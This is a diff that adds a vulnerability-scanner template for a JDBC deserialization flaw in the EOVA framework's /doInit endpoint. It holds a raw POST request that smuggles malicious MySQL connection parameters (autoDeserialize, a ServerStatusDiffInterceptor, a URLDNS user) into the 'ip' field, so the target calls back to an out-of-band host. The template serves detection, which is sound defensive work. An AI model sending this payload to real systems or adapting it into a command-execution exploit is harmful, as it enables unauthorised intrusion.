@@ -1,0 +1,27 @@
+id: EOVA-doInit-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: EOVA是一个基于JFinal开发平台的快速开发框架，旨在提供高效、易用的开发工具和组件，以简化开发过程。其设计理念是“简单才是高科技”，强调通过简化开发流程来提高效率，降低开发成本。 EOVA存在JDBC反序列化漏洞，由于JDBC连接mysql服务器的时候，参数完全可控，可传入恶意配置和恶意mysql服务器地址，导致反序列化漏洞。攻击者可利用该漏洞执行任意命令。
+  reference:
+    - https://forum.butian.net/article/560
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /doInit HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br, zstd
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 192
+
+        ip={{interactsh-url}}%2Ftest%3FautoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=URLDNS%26Yu9=Yu9%23&port=&username=root&password=123456
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
